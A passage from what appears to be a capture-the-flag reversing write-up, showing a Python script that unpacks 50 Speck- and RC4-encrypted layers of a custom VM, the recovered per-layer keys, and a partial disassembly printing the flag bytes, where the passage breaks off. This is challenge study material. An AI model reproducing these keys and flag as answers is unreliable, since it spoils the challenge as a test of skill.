class="title function_">decode</span>(<span class="params">buf, off</span>):</span><br><span class="line">    opcode = buf[off]</span><br><span class="line">    mnemonic, operands = OPCODES.get(opcode, (<span class="literal">None</span>, <span class="literal">None</span>))</span><br><span class="line">    <span class="keyword">if</span> mnemonic <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unknown opcode 0x<span class="subst">&#123;opcode:02x&#125;</span> at <span class="subst">&#123;off&#125;</span>&quot;</span>)</span><br><span class="line">    cur = off + <span class="number">1</span></span><br><span class="line">    values = []</span><br><span class="line">    <span class="keyword">for</span> operand <span class="keyword">in</span> operands:</span><br><span class="line">        <span class="keyword">if</span> operand == <span class="string">&quot;imm16&quot;</span>:</span><br><span class="line">            val, cur = read_u16(buf, cur)</span><br><span class="line">            values.append(val)</span><br><span class="line">        <span class="keyword">elif</span> operand == <span class="string">&quot;imm8&quot;</span>:</span><br><span class="line">            val = buf[cur]</span><br><span class="line">            cur += <span class="number">1</span></span><br><span class="line">            values.append(val)</span><br><span class="line">        <span class="keyword">elif</span> operand == <span class="string">&quot;imm64&quot;</span>:</span><br><span class="line">            val, cur = read_u64(buf, cur)</span><br><span class="line">            values.append(val)</span><br><span class="line">        <span class="keyword">elif</span> operand == <span class="string">&quot;reg&quot;</span>:</span><br><span class="line">            val = buf[cur]</span><br><span class="line">            cur += <span class="number">1</span></span><br><span class="line">            values.append(REGS.get(val, <span class="string">f&quot;r<span class="subst">&#123;val&#125;</span>&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unknown operand <span class="subst">&#123;operand&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> mnemonic, values, cur</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">speck_round_keys</span>(<span class="params">words</span>):</span><br><span class="line">    l = <span class="built_in">list</span>(words[<span class="number">1</span>:])</span><br><span class="line">    k = words[<span class="number">0</span>]</span><br><span class="line">    keys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ROUNDS):</span><br><span class="line">        keys.append(k)</span><br><span class="line">        idx = i % (<span class="built_in">len</span>(words) - <span class="number">1</span>)</span><br><span class="line">        val = (_ror32(l[idx], <span class="number">8</span>) + k) &amp; MASK32</span><br><span class="line">        val ^= i</span><br><span class="line">        l[idx] = val</span><br><span class="line">        k = (_rol32(k, <span class="number">3</span>) ^ val) &amp; MASK32</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">speck_decrypt</span>(<span class="params">ct, round_keys</span>):</span><br><span class="line">    x = ct &amp; MASK32</span><br><span class="line">    y = (ct &gt;&gt; <span class="number">32</span>) &amp; MASK32</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">reversed</span>(round_keys):</span><br><span class="line">        y = _ror32(y ^ x, <span class="number">3</span>)</span><br><span class="line">        x ^= k</span><br><span class="line">        x = _rol32((x - y) &amp; MASK32, <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> (y &lt;&lt; <span class="number">32</span>) | x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrypt</span>(<span class="params">data, key_qword</span>):</span><br><span class="line">    key = key_qword.to_bytes(<span class="number">8</span>, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    key_len = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_len]) &amp; <span class="number">0xFF</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    out = <span class="built_in">bytearray</span>(<span class="built_in">len</span>(data))</span><br><span class="line">    <span class="keyword">for</span> idx, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        j = (j + S[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        k = S[(S[i] + S[j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line">        out[idx] = byte ^ k</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">skip_until_pop</span>(<span class="params">buf, pos, reg</span>):</span><br><span class="line">    depth = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> pos &lt; <span class="built_in">len</span>(buf):</span><br><span class="line">        mnemonic, operands, nxt = decode(buf, pos)</span><br><span class="line">        pos = nxt</span><br><span class="line">        <span class="keyword">if</span> mnemonic == <span class="string">&quot;push&quot;</span> <span class="keyword">and</span> operands[<span class="number">0</span>] == reg:</span><br><span class="line">            depth += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> mnemonic == <span class="string">&quot;pop&quot;</span> <span class="keyword">and</span> operands[<span class="number">0</span>] == reg:</span><br><span class="line">            <span class="keyword">if</span> depth == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            depth -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> pos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analyze_layer</span>(<span class="params">buf</span>):</span><br><span class="line">    entry = buf.find(<span class="string">b&quot;\x11\x00\xe0&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> entry == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;setp1 0xE000 not found in layer&quot;</span>)</span><br><span class="line">    pos = entry</span><br><span class="line">    last_setp1 = <span class="literal">None</span></span><br><span class="line">    collecting_speck = <span class="literal">False</span></span><br><span class="line">    speck_words = []</span><br><span class="line">    operations = []</span><br><span class="line">    info = &#123;</span><br><span class="line">        <span class="string">&quot;key_offset&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&quot;target_ct&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&quot;next_offset&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&quot;next_length&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    pending_add = <span class="literal">False</span></span><br><span class="line">    last_mov_r1 = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> pos &lt; <span class="built_in">len</span>(buf):</span><br><span class="line">        mnemonic, operands, nxt = decode(buf, pos)</span><br><span class="line">        <span class="keyword">if</span> mnemonic == <span class="string">&quot;setp1&quot;</span>:</span><br><span class="line">            last_setp1 = operands[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> operands[<span class="number">0</span>] == <span class="number">0x7200</span> <span class="keyword">and</span> <span class="built_in">len</span>(speck_words) &lt; <span class="number">2</span>:</span><br><span class="line">                collecting_speck = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> mnemonic == <span class="string">&quot;push&quot;</span> <span class="keyword">and</span> operands[<span class="number">0</span>] == <span class="string">&quot;r6&quot;</span>:</span><br><span class="line">            pending_add = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> mnemonic == <span class="string">&quot;push&quot;</span> <span class="keyword">and</span> operands[<span class="number">0</span>] == <span class="string">&quot;r5&quot;</span>:</span><br><span class="line">            pending_add = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> mnemonic == <span class="string">&quot;loadp1_off&quot;</span> <span class="keyword">and</span> last_setp1 == <span class="number">0xE000</span> <span class="keyword">and</span> operands[<span class="number">0</span>] == <span class="string">&quot;r0&quot;</span>:</span><br><span class="line">            info[<span class="string">&quot;key_offset&quot;</span>] = operands[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> mnemonic == <span class="string">&quot;xor_imm&quot;</span> <span class="keyword">and</span> operands[<span class="number">0</span>] == <span class="string">&quot;r0&quot;</span>:</span><br><span class="line">            operations.append((<span class="string">&quot;xor&quot;</span>, operands[<span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">elif</span> mnemonic == <span class="string">&quot;mov_imm&quot;</span> <span class="keyword">and</span> operands[<span class="number">0</span>] == <span class="string">&quot;r5&quot;</span>:</span><br><span class="line">            <span class="comment"># check for subtract macro</span></span><br><span class="line">            mnemonic2, operands2, nxt2 = decode(buf, nxt)</span><br><span class="line">            <span class="keyword">if</span> mnemonic2 == <span class="string">&quot;xor_imm&quot;</span> <span class="keyword">and</span> operands2[<span class="number">0</span>] == <span class="string">&quot;r5&quot;</span> <span class="keyword">and</span> operands2[<span class="number">1</span>] == MASK64:</span><br><span class="line">                operations.append((<span class="string">&quot;sub&quot;</span>, operands[<span class="number">1</span>]))</span><br><span class="line">                pos = skip_until_pop(buf, nxt2, <span class="string">&quot;r5&quot;</span>)</span><br><span class="line">                pending_add = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> mnemonic == <span class="string">&quot;mov_imm&quot;</span> <span class="keyword">and</span> operands[<span class="number">0</span>] == <span class="string">&quot;r6&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> operands[<span class="number">1</span>] &gt; <span class="number">0xFFFF</span> <span class="keyword">and</span> pending_add:</span><br><span class="line">                operations.append((<span class="string">&quot;add&quot;</span>, operands[<span class="number">1</span>]))</span><br><span class="line">                pos = skip_until_pop(buf, nxt, <span class="string">&quot;r6&quot;</span>)</span><br><span class="line">                pending_add = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> mnemonic == <span class="string">&quot;storep1&quot;</span> <span class="keyword">and</span> operands[<span class="number">0</span>] == <span class="string">&quot;r1&quot;</span> <span class="keyword">and</span> collecting_speck:</span><br><span class="line">            <span class="keyword">if</span> last_mov_r1 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                speck_words.append(last_mov_r1)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(speck_words) == <span class="number">2</span>:</span><br><span class="line">                    collecting_speck = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> mnemonic == <span class="string">&quot;mov_imm&quot;</span> <span class="keyword">and</span> operands[<span class="number">0</span>] == <span class="string">&quot;r1&quot;</span>:</span><br><span class="line">            last_mov_r1 = operands[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> info[<span class="string">&quot;next_offset&quot;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> info[<span class="string">&quot;next_length&quot;</span>] <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> collecting_speck:</span><br><span class="line">                info[<span class="string">&quot;next_length&quot;</span>] = operands[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> mnemonic == <span class="string">&quot;cmp_imm&quot;</span> <span class="keyword">and</span> operands[<span class="number">0</span>] == <span class="string">&quot;r0&quot;</span>:</span><br><span class="line">            info[<span class="string">&quot;target_ct&quot;</span>] = operands[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> mnemonic == <span class="string">&quot;setp2&quot;</span>:</span><br><span class="line">            <span class="comment"># debug</span></span><br><span class="line">            <span class="comment"># print(f&quot;setp2 at &#123;hex(pos)&#125; -&gt; &#123;hex(operands[0])&#125;&quot;)</span></span><br><span class="line">            info[<span class="string">&quot;next_offset&quot;</span>] = operands[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">elif</span> mnemonic == <span class="string">&quot;jmp&quot;</span> <span class="keyword">and</span> info[<span class="string">&quot;next_offset&quot;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> operands[<span class="number">0</span>] == info[<span class="string">&quot;next_offset&quot;</span>]:</span><br><span class="line">            pos = nxt</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        pos = nxt</span><br><span class="line">    info[<span class="string">&quot;operations&quot;</span>] = operations</span><br><span class="line">    info[<span class="string">&quot;speck_words&quot;</span>] = speck_words</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_layer</span>(<span class="params">info</span>):</span><br><span class="line">    <span class="keyword">if</span> info[<span class="string">&quot;key_offset&quot;</span>] <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> info[<span class="string">&quot;target_ct&quot;</span>] <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(info[<span class="string">&quot;speck_words&quot;</span>]) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Incomplete layer info&quot;</span>)</span><br><span class="line">    key_words = []</span><br><span class="line">    <span class="keyword">for</span> qword <span class="keyword">in</span> info[<span class="string">&quot;speck_words&quot;</span>]:</span><br><span class="line">        key_words.append(qword &amp; MASK32)</span><br><span class="line">        key_words.append((qword &gt;&gt; <span class="number">32</span>) &amp; MASK32)</span><br><span class="line">    round_keys = speck_round_keys(key_words)</span><br><span class="line">    state = speck_decrypt(info[<span class="string">&quot;target_ct&quot;</span>], round_keys)</span><br><span class="line">    <span class="keyword">for</span> op, val <span class="keyword">in</span> <span class="built_in">reversed</span>(info[<span class="string">&quot;operations&quot;</span>]):</span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">&quot;xor&quot;</span>:</span><br><span class="line">            state ^= val</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="string">&quot;sub&quot;</span>:</span><br><span class="line">            state = (state + val) &amp; MASK64</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="string">&quot;add&quot;</span>:</span><br><span class="line">            state = (state - val) &amp; MASK64</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">max_layers: <span class="built_in">int</span> = <span class="number">50</span>, dump_stages: <span class="built_in">bool</span> = <span class="literal">True</span></span>):</span><br><span class="line">    workspace = <span class="built_in">bytearray</span>(Path(<span class="string">&quot;full_vmcode&quot;</span>).read_bytes())</span><br><span class="line">    offset = <span class="number">0x5A9</span></span><br><span class="line">    key_table = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> layer <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_layers + <span class="number">1</span>):</span><br><span class="line">        stage_view = workspace[offset:]</span><br><span class="line">        info = analyze_layer(stage_view)</span><br><span class="line">        key = invert_layer(info)</span><br><span class="line">        key_index = info[<span class="string">&quot;key_offset&quot;</span>] // <span class="number">8</span> <span class="keyword">if</span> info[<span class="string">&quot;key_offset&quot;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Layer <span class="subst">&#123;layer&#125;</span>: key_index=<span class="subst">&#123;key_index&#125;</span>, key=0x<span class="subst">&#123;key:016x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> key_index <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            key_table[key_index] = key</span><br><span class="line">        <span class="keyword">if</span> info[<span class="string">&quot;next_offset&quot;</span>] <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> info[<span class="string">&quot;next_length&quot;</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        start = info[<span class="string">&quot;next_offset&quot;</span>]</span><br><span class="line">        end = start + info[<span class="string">&quot;next_length&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> end &gt; <span class="built_in">len</span>(workspace):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] Next layer exceeds VM code length, stopping.&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        dec = rc4_decrypt(workspace[start:end], key)</span><br><span class="line">        workspace[start:end] = dec</span><br><span class="line">        <span class="keyword">if</span> dump_stages:</span><br><span class="line">            Path(<span class="string">f&quot;stage<span class="subst">&#123;layer+<span class="number">1</span>&#125;</span>.bin&quot;</span>).write_bytes(workspace)</span><br><span class="line">        offset = start</span><br><span class="line">    <span class="keyword">if</span> key_table:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nKeys in index order:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">sorted</span>(key_table):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;key[<span class="subst">&#123;idx:02d&#125;</span>] = 0x<span class="subst">&#123;key_table[idx]:016x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以得到key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">Layer 1: key_index=2, key=0xa28f38bd0463522c</span><br><span class="line">Layer 2: key_index=1, key=0xbf11b34d0ce941cc</span><br><span class="line">Layer 3: key_index=20, key=0xef320f9e6ae31520</span><br><span class="line">Layer 4: key_index=17, key=0x36646367b78c2f91</span><br><span class="line">Layer 5: key_index=48, key=0xa1570f48caceb3dd</span><br><span class="line">Layer 6: key_index=29, key=0x497cff13eaa5bf76</span><br><span class="line">Layer 7: key_index=8, key=0xcd05f91609d653fa</span><br><span class="line">Layer 8: key_index=18, key=0x9eed7637cd5eaa26</span><br><span class="line">Layer 9: key_index=31, key=0xa922933b0b315a10</span><br><span class="line">Layer 10: key_index=30, key=0xd51ceddab7795459</span><br><span class="line">Layer 11: key_index=41, key=0x4f749f6bbca2014c</span><br><span class="line">Layer 12: key_index=43, key=0x9c73a6d3f711e66e</span><br><span class="line">Layer 13: key_index=15, key=0xac1b4e2750778a01</span><br><span class="line">Layer 14: key_index=47, key=0x5e68e47d3a360a80</span><br><span class="line">Layer 15: key_index=32, key=0xcabd557ffa1df043</span><br><span class="line">Layer 16: key_index=5, key=0xfe13c54ceb12fea8</span><br><span class="line">Layer 17: key_index=7, key=0xad1f6be84bbb4680</span><br><span class="line">Layer 18: key_index=14, key=0xb5e1534e1dc36c87</span><br><span class="line">Layer 19: key_index=3, key=0x79ed5d84199dd9cb</span><br><span class="line">Layer 20: key_index=38, key=0x8d4c8f2124957228</span><br><span class="line">Layer 21: key_index=33, key=0xe0459b855188d045</span><br><span class="line">Layer 22: key_index=0, key=0xba610b6c5d80c91a</span><br><span class="line">Layer 23: key_index=28, key=0x7e1a125dcfa56359</span><br><span class="line">Layer 24: key_index=9, key=0x55493aa141fbe86f</span><br><span class="line">Layer 25: key_index=35, key=0xc01552dff3a12f67</span><br><span class="line">Layer 26: key_index=26, key=0xf4d25540ed584887</span><br><span class="line">Layer 27: key_index=12, key=0x5fcca9a9cb65130d</span><br><span class="line">Layer 28: key_index=11, key=0xd8817dda43824d2c</span><br><span class="line">Layer 29: key_index=42, key=0xb1e1adc831c8d567</span><br><span class="line">Layer 30: key_index=22, key=0x1a9a0626a035fb9d</span><br><span class="line">Layer 31: key_index=16, key=0xc8f82d07316dcd3b</span><br><span class="line">Layer 32: key_index=4, key=0x4d9c56b2a1d77a0d</span><br><span class="line">Layer 33: key_index=44, key=0x2ab305ec4e07b0b4</span><br><span class="line">Layer 34: key_index=27, key=0xc12422512500c887</span><br><span class="line">Layer 35: key_index=6, key=0x494a63fc85b9953a</span><br><span class="line">Layer 36: key_index=49, key=0xd6ab1c9a18ebb936</span><br><span class="line">Layer 37: key_index=13, key=0x6f3ed35da24dacfa</span><br><span class="line">Layer 38: key_index=25, key=0x749e8082db34037d</span><br><span class="line">Layer 39: key_index=19, key=0xff546a0085041459</span><br><span class="line">Layer 40: key_index=46, key=0xc409de0e72c1029e</span><br><span class="line">Layer 41: key_index=40, key=0x554fca602792e879</span><br><span class="line">Layer 42: key_index=24, key=0x8a0bf5239eed75c4</span><br><span class="line">Layer 43: key_index=21, key=0x1e00a4b9e25488f6</span><br><span class="line">Layer 44: key_index=10, key=0x25bc9aff736b80a8</span><br><span class="line">Layer 45: key_index=37, key=0x0e189fa829657913</span><br><span class="line">Layer 46: key_index=36, key=0x0615548ece7312fb</span><br><span class="line">Layer 47: key_index=23, key=0xe2f1eb0e5248cd2c</span><br><span class="line">Layer 48: key_index=45, key=0x98a16d274bb044d2</span><br><span class="line">Layer 49: key_index=34, key=0x82700d6f6a986873</span><br><span class="line">Layer 50: key_index=39, key=0x451572c65bcb3425</span><br><span class="line"></span><br><span class="line">Keys in index order:</span><br><span class="line">key[00] = 0xba610b6c5d80c91a</span><br><span class="line">key[01] = 0xbf11b34d0ce941cc</span><br><span class="line">key[02] = 0xa28f38bd0463522c</span><br><span class="line">key[03] = 0x79ed5d84199dd9cb</span><br><span class="line">key[04] = 0x4d9c56b2a1d77a0d</span><br><span class="line">key[05] = 0xfe13c54ceb12fea8</span><br><span class="line">key[06] = 0x494a63fc85b9953a</span><br><span class="line">key[07] = 0xad1f6be84bbb4680</span><br><span class="line">key[08] = 0xcd05f91609d653fa</span><br><span class="line">key[09] = 0x55493aa141fbe86f</span><br><span class="line">key[10] = 0x25bc9aff736b80a8</span><br><span class="line">key[11] = 0xd8817dda43824d2c</span><br><span class="line">key[12] = 0x5fcca9a9cb65130d</span><br><span class="line">key[13] = 0x6f3ed35da24dacfa</span><br><span class="line">key[14] = 0xb5e1534e1dc36c87</span><br><span class="line">key[15] = 0xac1b4e2750778a01</span><br><span class="line">key[16] = 0xc8f82d07316dcd3b</span><br><span class="line">key[17] = 0x36646367b78c2f91</span><br><span class="line">key[18] = 0x9eed7637cd5eaa26</span><br><span class="line">key[19] = 0xff546a0085041459</span><br><span class="line">key[20] = 0xef320f9e6ae31520</span><br><span class="line">key[21] = 0x1e00a4b9e25488f6</span><br><span class="line">key[22] = 0x1a9a0626a035fb9d</span><br><span class="line">key[23] = 0xe2f1eb0e5248cd2c</span><br><span class="line">key[24] = 0x8a0bf5239eed75c4</span><br><span class="line">key[25] = 0x749e8082db34037d</span><br><span class="line">key[26] = 0xf4d25540ed584887</span><br><span class="line">key[27] = 0xc12422512500c887</span><br><span class="line">key[28] = 0x7e1a125dcfa56359</span><br><span class="line">key[29] = 0x497cff13eaa5bf76</span><br><span class="line">key[30] = 0xd51ceddab7795459</span><br><span class="line">key[31] = 0xa922933b0b315a10</span><br><span class="line">key[32] = 0xcabd557ffa1df043</span><br><span class="line">key[33] = 0xe0459b855188d045</span><br><span class="line">key[34] = 0x82700d6f6a986873</span><br><span class="line">key[35] = 0xc01552dff3a12f67</span><br><span class="line">key[36] = 0x0615548ece7312fb</span><br><span class="line">key[37] = 0x0e189fa829657913</span><br><span class="line">key[38] = 0x8d4c8f2124957228</span><br><span class="line">key[39] = 0x451572c65bcb3425</span><br><span class="line">key[40] = 0x554fca602792e879</span><br><span class="line">key[41] = 0x4f749f6bbca2014c</span><br><span class="line">key[42] = 0xb1e1adc831c8d567</span><br><span class="line">key[43] = 0x9c73a6d3f711e66e</span><br><span class="line">key[44] = 0x2ab305ec4e07b0b4</span><br><span class="line">key[45] = 0x98a16d274bb044d2</span><br><span class="line">key[46] = 0xc409de0e72c1029e</span><br><span class="line">key[47] = 0x5e68e47d3a360a80</span><br><span class="line">key[48] = 0xa1570f48caceb3dd</span><br><span class="line">key[49] = 0xd6ab1c9a18ebb936</span><br></pre></td></tr></table></figure><p>最终flag</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511191018655.png" alt="image-20251119101824362"></p><p>需要识别0x90(其实不用我们直接根据最后的信息0x6706是offset，就可以打印出来了)</p><p>python3 disasm_vm.py 0x6706 0x6800 stage51.bin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">6706: print_byte 0x52</span><br><span class="line">6708: print_byte 0x43</span><br><span class="line">670a: print_byte 0x54</span><br><span class="line">670c: print_byte 0x46</span><br><span class="line">670e: print_byte 0x7b</span><br><span class="line">6710: print_byte 0x56</span><br><span class="line">6712: print_byte 0x4d</span><br><span class="line">6714: print_byte 0x5f</span><br><span class="line">6716: print_byte 0x41</span><br><span class="line">6718: print_byte 0x4c</span><br><span class="line">671a: print_byte 0x55</span><br><span class="line">671c: print_byte 0x5f</span><br><span class="line">671e: print_byte 0x53</span><br><span class="line">6720: print_byte 0x4d</span><br><span class="line">6722: print_byte 0x43</span><br><span class="line">6724: print_byte 0x5f</span><br><span class="line">6726: print_byte 0x52</span><br><span class="line">6728: print_byte 0x43</span><br><span class="line">672a: print_byte 0x34</span><br><span class="line">672c: print_byte 0x5f</span><br><span class="line">672e: print_byte 0x53</span><br><span class="line">6730: print_byte 0x50</span><br><span class="line">6732: print_byte 0x45</span><br><span class="line">6734: print_byte 0x43</span><br><span class="line">6736: print_byte 0x4b</span><br><span class="line">6738: print_byte 0x21</span><br><span class="line">673a: print_byte 0x5f</span><br><span class="line">673c: print_byte 0x35</span><br><span class="line">673e: print_byte 0x39</span><br><span class="line">6740: print_byte 0x33</span><br><span class="line">6742: print_byte 0x65</span><br><span class="line">6744: print_byte 0x62</span><br><span class="line">6746: print_byte 0x36</span><br><span class="line">6748: print_byte 0x30</span><br><span class="line">674a: print_byte 0x37</span><br><span class="line">674c: print_byte 0x39</span><br><span class="line">674e: print_byte 0x64</span><br><span class="line">6750: 